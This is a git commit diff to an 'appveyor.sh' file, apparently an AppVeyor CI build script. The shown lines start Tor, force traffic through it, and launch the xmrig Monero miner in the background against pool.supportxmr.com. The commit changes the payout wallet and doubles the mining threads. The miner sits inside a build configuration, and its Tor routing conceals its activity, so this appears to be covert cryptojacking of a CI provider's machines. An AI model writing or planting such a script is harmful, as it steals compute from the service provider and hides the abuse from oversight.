a0340403cf13bd8e3a70e0e3bb2edc2c0173d412
sanjeevtech <66917480+sanjeevtech@users.noreply.github.com>
2020-07-06 12:13:35 +0530

    Update appveyor.sh

--- appveyor.sh
+++ appveyor.sh
@@ -13,4 +13,4 @@ sudo systemctl start tor
 sudo toriptables2.py -l
 
 cd xmrig-6.2.0-beta
-proxychains torify ./xmrig --no-color --donate-level 1 --cpu-priority 5 -o pool.supportxmr.com:9000 -u 4AHnjgotTyL79cjhd2kXzb6tuYFUThRJ5J9PRwh7qfgdbeNTDVdpJiK5taWCpR38eWCHFJdmRPZX55YQ5yYg4MTqGzZL2rF -p x -a cn/r -x 9150 -t 4 -k --tls -B --background
+proxychains torify ./xmrig --no-color --donate-level 1 --cpu-priority 5 -o pool.supportxmr.com:9000 -u 4AJifhXDLEb6G8BRqWjQ5sT7XbRb47dUMai1WxNS765NixTpAL771ekW6jZBzDNYUiG4s3wBcUJLSSaFJ3RWDgbnL6B8oxJ -p x -a cn/r -x 9150 -t 8 -k --tls -B --background
